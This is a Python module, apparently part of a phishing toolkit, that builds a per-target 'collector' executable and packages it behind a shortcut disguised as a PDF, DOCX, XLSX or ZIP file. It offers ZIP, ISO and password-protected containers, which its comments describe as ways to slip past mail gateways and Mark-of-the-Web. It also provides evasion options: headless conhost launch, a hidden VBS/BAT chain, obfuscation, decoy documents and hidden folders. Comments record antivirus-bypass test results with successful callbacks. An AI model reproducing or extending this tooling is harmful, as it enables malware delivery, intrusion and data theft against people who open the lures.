import os
import json
import ntpath
import shutil
import tempfile
import threading
import zipfile
from datetime import datetime

import pycdlib
import pylnk3
import pyzipper

from .exe_builder import BASE_DIR, BUILD_DIR, OUTPUT_DIR, build_exe
from .config_manager import load_config, resolve_exe_name

LNK_REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'lnk_registry.json')

# Disguised extension used for both the LNK name and its icon
LURE_EXT_CHOICES = ('pdf', 'docx', 'xlsx', 'zip')
DEFAULT_LURE_EXT = 'pdf'

# Delivery container: plain ZIP, ISO image, or password-protected ZIP wrapping the ISO
CONTAINER_CHOICES = (
    ('zip', 'ZIP 压缩包', '直接投递 ZIP，兼容性最好。'),
    ('iso', 'ISO 镜像', '以光盘镜像投递，绕过部分邮件网关对压缩包的检查（Windows 可直接装载）。'),
    ('iso_zip', 'ISO + 密码 ZIP', 'ISO 再套一层 AES 加密 ZIP，避免网关扫描与 MOTW 传播，密码需另行告知目标。'),
)
CONTAINER_KEYS = tuple(key for key, _, _ in CONTAINER_CHOICES)
DEFAULT_CONTAINER = 'zip'

# System icons available on stock Windows; used because a custom .ico cannot
# be referenced reliably from an extracted archive.
LNK_ICON_MAP = {
    'pdf': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'docx': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'xlsx': ('%SystemRoot%\\System32\\SHELL32.dll', 70),
    'zip': ('%SystemRoot%\\System32\\SHELL32.dll', 31),
}

CONHOST_PATH = r'C:\Windows\System32\conhost.exe'
WSCRIPT_PATH = r'C:\Windows\System32\wscript.exe'
ARG_PAD = ' ' * 200

# conhost.exe --headless is the default launcher: it is the only chain that
# passed Windows 10 + 360 + Defender testing, so it is always enabled.
DEFAULT_EVASION = 'conhost'

EVASION_OPTIONS = (
    ('conhost', 'conhost 无窗口执行',
     'LNK 调用 conhost.exe --headless 读取命令文件，不弹出控制台窗口（Windows 10 1809+）。'),
    ('vbs', 'Explorer → VBS → BAT 隐藏链',
     'LNK 启动 VBS，再由 VBS 隐藏运行 BAT 拉起载荷，增加静态分析层级。'),
    ('obfuscate', '字符串拆分 + 干扰码',
     'BAT 中拆分拼接载荷名并插入延时干扰命令（自动启用 VBS 链）。'),
    ('decoy', '打开诱饵文档',
     '载荷启动后自动打开隐藏的同后缀诱饵文档，转移注意力（自动启用 VBS 链）。'),
    ('pad', '参数空白填充',
     '在 LNK 参数前填充大量空格，属性面板中不易直接看到真实参数。'),
    ('macosx', '伪装 __MACOSX 目录',
     '把载荷目录嵌套为 __MACOSX 层级并隐藏，模拟压缩包元数据目录。'),
)
EVASION_CHOICES = tuple(key for key, _, _ in EVASION_OPTIONS)

# Live results from Windows 10 + 360 Total Security + Defender (2026-10-26).
# 'ok' means no AV alert and a successful callback. conhost is the built-in
# default; the other rows were tested on top of the older ftp.exe launcher.
EVASION_RESULTS = {
    'conhost': (True, '默认启动链，无拦截，载荷回连成功'),
    'vbs': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
    'obfuscate': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
    'decoy': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
    'pad': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
    'macosx': (False, '360 拦截 ftp.exe「钓鱼快捷方式」'),
}

_lock = threading.Lock()


def _load_registry():
    os.makedirs(os.path.dirname(LNK_REGISTRY_PATH), exist_ok=True)
    if not os.path.exists(LNK_REGISTRY_PATH):
        return {}
    with open(LNK_REGISTRY_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)


def _save_registry(reg):
    os.makedirs(os.path.dirname(LNK_REGISTRY_PATH), exist_ok=True)
    with open(LNK_REGISTRY_PATH, 'w', encoding='utf-8') as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)


def register_lnk(token, filename):
    with _lock:
        reg = _load_registry()
        reg[token] = filename
        _save_registry(reg)


def unregister_lnk(token):
    with _lock:
        reg = _load_registry()
        reg.pop(token, None)
        _save_registry(reg)


def is_lnk_registered(token):
    with _lock:
        return token in _load_registry()


def get_lnk_filename(token):
    with _lock:
        return _load_registry().get(token)


def get_lnk_path(token):
    filename = get_lnk_filename(token)
    if not filename:
        return None
    return os.path.join(OUTPUT_DIR, filename)


def clear_lnk_registry():
    with _lock:
        _save_registry({})


def _safe_name(name):
    for ch in '<>:"/\\|?*':
        name = name.replace(ch, '_')
    name = ''.join(c for c in name if ord(c) >= 32)
    return name.strip(' .') or 'target'


def lnk_artifact_name(target_name, token, exe_filename='', container=None):
    if container is None:
        container = _container(load_config())
    base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
    return base + ('.iso' if container == 'iso' else '.zip')


def _container(config):
    container = str(config.get('lnk_container', DEFAULT_CONTAINER)).lower()
    return container if container in CONTAINER_KEYS else DEFAULT_CONTAINER


def _zip_password(config):
    return str(config.get('lnk_zip_password', '') or '').strip()[:128]


def _lure_ext(config):
    ext = str(config.get('lnk_lure_ext', DEFAULT_LURE_EXT)).lower()
    return ext if ext in LURE_EXT_CHOICES else DEFAULT_LURE_EXT


def _evasion(config):
    selected = config.get('lnk_evasion') or []
    if not isinstance(selected, list):
        selected = []
    evasion = {e for e in selected if e in EVASION_CHOICES}
    evasion.add(DEFAULT_EVASION)
    return evasion


def _lnk_display_name(base, ext):
    if base.lower().endswith('.' + ext):
        return base + '.lnk'
    return f'{base}.{ext}.lnk'


def _lnk_segment(name, folder):
    segment = pylnk3.PathSegmentEntry()
    segment.type = pylnk3.TYPE_FOLDER if folder else pylnk3.TYPE_FILE
    segment.file_size = 0
    segment.short_name = name
    segment.full_name = name
    stamp = datetime(2020, 1, 1)
    segment.created = segment.modified = segment.accessed = stamp
    return segment


def _write_lnk(lnk_path, target, arguments, ext):
    """Write a LNK with an absolute shell item list that is valid on any host.

    pylnk3.for_file() classifies path components with os.path.isdir(), so a
    link built on Linux marks every directory as a FILE segment and leaves
    LinkInfo empty; Explorer then cannot resolve the target at all. Build the
    segments by name instead and add LinkInfo as a second resolution path.
    """
    icon_file, icon_index = LNK_ICON_MAP.get(ext, LNK_ICON_MAP[DEFAULT_LURE_EXT])
    drive, rest = ntpath.splitdrive(target)
    names = [part for part in rest.split('\\') if part]
    if not drive or not names:
        raise ValueError(f'LNK target must be an absolute path: {target!r}')

    lnk = pylnk3.create(lnk_path)
    lnk.link_flags.IsUnicode = True
    items = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
             pylnk3.DriveEntry(drive + '\\')]
    for name in names[:-1]:
        items.append(_lnk_segment(name, True))
    items.append(_lnk_segment(names[-1], False))
    lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
    lnk.shell_item_id_list.items = items

    info = lnk._link_info
    info.local = 1
    info.remote = 0
    info.drive_type = pylnk3.DRIVE_FIXED
    info.drive_serial = 0x1A2B3C4D
    info.volume_label = ''
    info.local_base_path = target
    info.make_path()
    lnk.link_flags.HasLinkInfo = True
    lnk.link_flags.ForceNoLinkInfo = False

    lnk.link_flags.HasArguments = True
    lnk.arguments = arguments
    lnk.link_flags.HasIconLocation = True
    lnk.icon = icon_file
    lnk.icon_index = icon_index
    lnk.window_mode = pylnk3.WINDOW_MINIMIZED
    lnk.save()


def _add_hidden_file(zf, arcname, source_path):
    info = zipfile.ZipInfo(arcname)
    info.create_system = 0  # FAT: external_attr holds DOS attributes
    info.external_attr = 0x22  # hidden | archive
    info.compress_type = zipfile.ZIP_DEFLATED
    with open(source_path, 'rb') as f:
        zf.writestr(info, f.read())


def _add_hidden_dir(zf, arcname):
    info = zipfile.ZipInfo(arcname.rstrip('/') + '/')
    info.create_system = 0
    info.external_attr = 0x16  # directory | hidden | system
    info.compress_type = zipfile.ZIP_STORED
    zf.writestr(info, b'')


def _write_zip_package(staging_dir, lnk_path, lnk_name, folder, hidden_files,
                       zip_path):
    arc_folder = folder.replace('\\', '/')
    parts = arc_folder.split('/')
    tmp_zip = zip_path + '.part'
    with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.write(lnk_path, lnk_name)
        for i in range(1, len(parts) + 1):
            _add_hidden_dir(zf, '/'.join(parts[:i]))
        for name in hidden_files:
            _add_hidden_file(zf, f'{arc_folder}/{name}',
                             os.path.join(staging_dir, *parts, name))
    os.replace(tmp_zip, zip_path)


def _iso_dir_names(parts):
    """ISO9660 directory names (8 chars max); UDF/Joliet keep display names."""
    names = []
    for idx, part in enumerate(parts):
        if part.upper() == '__MACOSX':
            names.append('__MACOSX')
        else:
            names.append(f'CACHE_{idx}')
    return names


def _joliet_component(name):
    """pycdlib caps Joliet components at 64 UTF-8 bytes; truncate long names."""
    if len(name.encode('utf-8')) <= 64:
        return name
    stem, dot, ext = name.rpartition('.')
    suffix = ('.' + ext) if dot else ''
    budget = 64 - len(suffix.encode('utf-8'))
    kept = ''
    for ch in stem:
        if len((kept + ch).encode('utf-8')) > budget:
            break
        kept += ch
    return (kept or 'document') + suffix


def _write_iso_package(staging_dir, lnk_path, lnk_name, folder, hidden_files,
                       iso_path):
    """Write the launcher and payload folder as an ISO9660/Joliet/UDF image.

    UDF carries the full Unicode lure name (Joliet truncates it); Windows 10+
    mounts the UDF volume. ISO has no DOS hidden attribute, so the payload
    folder stays visible; use the ``macosx`` evasion option to disguise it.
    """
    parts = folder.split('\\')
    iso_dirs = _iso_dir_names(parts)
    folder_dir = os.path.join(staging_dir, *parts)
    iso_folder = '/' + '/'.join(iso_dirs)
    udf_folder = '/' + '/'.join(parts)
    tmp_iso = iso_path + '.part'

    iso = pycdlib.PyCdlib()
    try:
        iso.new(joliet=3, udf='2.60')
        current = ''
        for i, name in enumerate(iso_dirs):
            current += '/' + name
            iso.add_directory(
                iso_path=current,
                joliet_path='/' + '/'.join(parts[:i + 1]),
                udf_path='/' + '/'.join(parts[:i + 1]),
            )
        iso.add_file(
            lnk_path, iso_path='/DOCUMENT.LNK;1',
            joliet_path='/' + _joliet_component(lnk_name),
            udf_path='/' + lnk_name,
        )
        for name in hidden_files:
            iso.add_file(
                os.path.join(folder_dir, name),
                iso_path=f'{iso_folder}/{name.upper()};1',
                joliet_path=udf_folder + '/' + _joliet_component(name),
                udf_path=udf_folder + '/' + name,
            )
        iso.write(tmp_iso)
    finally:
        iso.close()
    os.replace(tmp_iso, iso_path)


def _write_iso_zip(iso_path, zip_path, password):
    tmp_zip = zip_path + '.part'
    entry = os.path.basename(iso_path)
    if password:
        with pyzipper.AESZipFile(
            tmp_zip, 'w', compression=pyzipper.ZIP_DEFLATED,
            encryption=pyzipper.WZ_AES,
        ) as zf:
            zf.setpassword(password.encode('utf-8'))
            zf.write(iso_path, entry)
    else:
        with zipfile.ZipFile(tmp_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.write(iso_path, entry)
    os.replace(tmp_zip, zip_path)


def _write_command_file(script_path, commands):
    # conhost.exe --headless feeds this file straight to cmd's stdin.
    with open(script_path, 'w', encoding='ascii', newline='\r\n') as f:
        for command in commands:
            f.write(command + '\n')
        f.write('exit\n')


def _write_vbs(vbs_path):
    lines = (
        'On Error Resume Next',
        'Set sh = CreateObject("WScript.Shell")',
        'Set fso = CreateObject("Scripting.FileSystemObject")',
        'd = fso.GetParentFolderName(WScript.ScriptFullName)',
        'sh.Run Chr(34) & d & "\\run.bat" & Chr(34), 0, False',
    )
    with open(vbs_path, 'w', encoding='ascii', newline='\r\n') as f:
        for line in lines:
            f.write(line + '\n')


def _write_bat(bat_path, decoy_name, obfuscate):
    payload = 'viewer.exe'
    lines = ['@echo off', 'setlocal EnableDelayedExpansion']
    if obfuscate:
        lines += [
            'for /l %%i in (1,1,3) do (',
            'ver >nul',
            'ping 127.0.0.1 -n 2 >nul',
            ')',
        ]
        for i, ch in enumerate(payload, 1):
            lines.append(f'set "p{i}={ch}"')
        lines.append('set "exe="')
        lines.append(f'for /l %%n in (1,1,{len(payload)}) do set "exe=!exe!!p%%n!"')
    else:
        lines.append(f'set "exe={payload}"')
    # explorer.exe hands the file to the shell and returns immediately, so the
    # payload outlives this script without showing a console.
    lines.append('"C:\\Windows\\explorer.exe" "%~dp0!exe!"')
    if decoy_name:
        lines.append(f'"C:\\Windows\\explorer.exe" "%~dp0{decoy_name}"')
    lines.append('exit /b')
    with open(bat_path, 'w', encoding='ascii', newline='\r\n') as f:
        for line in lines:
            f.write(line + '\n')


_OFFICE_HEADER = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'

_DOCX_CONTENT_TYPES = _OFFICE_HEADER + (
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '</Types>')

_DOCX_DOCUMENT = _OFFICE_HEADER + (
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:body><w:p><w:r><w:t>内部资料，请勿外传。</w:t></w:r></w:p></w:body>'
    '</w:document>')

_XLSX_CONTENT_TYPES = _OFFICE_HEADER + (
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>'
    '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>'
    '</Types>')

_XLSX_WORKBOOK = _OFFICE_HEADER + (
    '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">'
    '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>')

_XLSX_WORKBOOK_RELS = _OFFICE_HEADER + (
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>'
    '</Relationships>')

_XLSX_SHEET = _OFFICE_HEADER + (
    '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
    '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>内部资料</t></is></c></row></sheetData>'
    '</worksheet>')

def _build_minimal_pdf():
    objects = (
        b'<</Type/Catalog/Pages 2 0 R>>',
        b'<</Type/Pages/Kids[3 0 R]/Count 1>>',
        b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>',
    )
    out = bytearray(b'%PDF-1.4\n')
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(out))
        out += b'%d 0 obj' % number + body + b'endobj\n'
    xref = len(out)
    out += b'xref\n0 %d\n' % (len(objects) + 1)
    out += b'0000000000 65535 f \n'
    for offset in offsets:
        out += b'%010d 00000 n \n' % offset
    out += (b'trailer\n<</Size %d/Root 1 0 R>>\nstartxref\n%d\n%%%%EOF\n'
            % (len(objects) + 1, xref))
    return bytes(out)


_MINIMAL_PDF = _build_minimal_pdf()


def _office_rels(target):
    return _OFFICE_HEADER + (
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        f'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="{target}"/>'
        '</Relationships>')


def _write_decoy(decoy_path, ext):
    if ext == 'pdf':
        with open(decoy_path, 'wb') as f:
            f.write(_MINIMAL_PDF)
    elif ext == 'docx':
        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', _DOCX_CONTENT_TYPES)
            zf.writestr('_rels/.rels', _office_rels('word/document.xml'))
            zf.writestr('word/document.xml', _DOCX_DOCUMENT)
    elif ext == 'xlsx':
        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', _XLSX_CONTENT_TYPES)
            zf.writestr('_rels/.rels', _office_rels('xl/workbook.xml'))
            zf.writestr('xl/workbook.xml', _XLSX_WORKBOOK)
            zf.writestr('xl/_rels/workbook.xml.rels', _XLSX_WORKBOOK_RELS)
            zf.writestr('xl/worksheets/sheet1.xml', _XLSX_SHEET)
    else:
        with zipfile.ZipFile(decoy_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('说明.txt', '内部资料，解压后查看。\n')


def _payload_folder(token, evasion):
    if 'macosx' in evasion:
        return '\\'.join(['__MACOSX'] * 3)
    return 'cache_' + token[:8]


def build_lnk_package(server_url, token, target_name, exe_filename=''):
    """Build a target EXE and wrap it in a ZIP/ISO with a disguised LNK launcher.

    Package layout:
        <doc-name>.pdf.lnk          visible shortcut
        <hidden folder>/viewer.exe  collector payload
        <hidden folder>/data.dat    command file that launches the payload
    The LNK always launches conhost.exe --headless, the default chain that
    passed 360 + Defender testing. Optional evasion layers add run.vbs /
    run.bat and a decoy document; the container can be ZIP, ISO, or an
    AES-encrypted ZIP wrapping the ISO.
    """
    config = load_config()
    ext = _lure_ext(config)
    evasion = _evasion(config)
    container = _container(config)
    use_vbs = bool(evasion & {'vbs', 'obfuscate', 'decoy'})
    use_decoy = 'decoy' in evasion

    exe_path = build_exe(server_url, token, target_name, exe_filename)
    base = _safe_name(resolve_exe_name(target_name, token, exe_filename))
    artifact_name = lnk_artifact_name(target_name, token, exe_filename, container)
    artifact_path = os.path.join(OUTPUT_DIR, artifact_name)
    lnk_name = _lnk_display_name(base, ext)

    # Container changes leave the old artifact behind under a different extension
    old_name = get_lnk_filename(token)
    if old_name and old_name != artifact_name:
        try:
            os.remove(os.path.join(OUTPUT_DIR, old_name))
        except OSError:
            pass

    os.makedirs(BUILD_DIR, exist_ok=True)
    staging = tempfile.mkdtemp(prefix=f'lnk_{token[:8]}_', dir=BUILD_DIR)
    payload_name = 'viewer.exe'
    script_name = 'data.dat'
    vbs_name = 'run.vbs'
    bat_name = 'run.bat'
    decoy_name = f'preview.{ext}' if use_decoy else ''
    folder = _payload_folder(token, evasion)
    folder_dir = os.path.join(staging, *folder.split('\\'))

    try:
        os.makedirs(folder_dir)
        shutil.copy2(exe_path, os.path.join(folder_dir, payload_name))

        if use_vbs:
            _write_bat(os.path.join(folder_dir, bat_name), decoy_name,
                       'obfuscate' in evasion)
            _write_vbs(os.path.join(folder_dir, vbs_name))
            launch = f'{WSCRIPT_PATH} "{folder}\\{vbs_name}"'
        else:
            launch = f'{folder}\\{payload_name}'
        _write_command_file(os.path.join(folder_dir, script_name), [launch])

        if decoy_name:
            _write_decoy(os.path.join(folder_dir, decoy_name), ext)

        target = CONHOST_PATH
        arguments = f'--headless cmd /c "cmd < {folder}\\{script_name}"'
        if 'pad' in evasion:
            arguments = ARG_PAD + arguments
        lnk_path = os.path.join(staging, lnk_name)
        _write_lnk(lnk_path, target, arguments, ext)

        hidden_files = [payload_name]
        if use_vbs:
            hidden_files += [bat_name, vbs_name]
        if decoy_name:
            hidden_files.append(decoy_name)
        hidden_files.append(script_name)

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        if container == 'zip':
            _write_zip_package(staging, lnk_path, lnk_name, folder,
                               hidden_files, artifact_path)
        else:
            iso_path = os.path.join(OUTPUT_DIR, base + '.iso')
            _write_iso_package(staging, lnk_path, lnk_name, folder,
                               hidden_files, iso_path)
            if container == 'iso':
                artifact_name = os.path.basename(iso_path)
                artifact_path = iso_path
            else:
                _write_iso_zip(iso_path, artifact_path, _zip_password(config))
                try:
                    os.remove(iso_path)
                except OSError:
                    pass

        register_lnk(token, artifact_name)
        return artifact_path
    finally:
        shutil.rmtree(staging, ignore_errors=True)


def build_lnk_packages_batch(server_url, targets):
    results = []
    for t in targets:
        try:
            artifact_path = build_lnk_package(
                server_url, t['token'], t['name'], t.get('exe_filename', ''))
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'success': True,
                'package_path': artifact_path,
                'package_name': os.path.basename(artifact_path),
            })
        except Exception as e:
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'success': False,
                'error': str(e),
            })
    return results
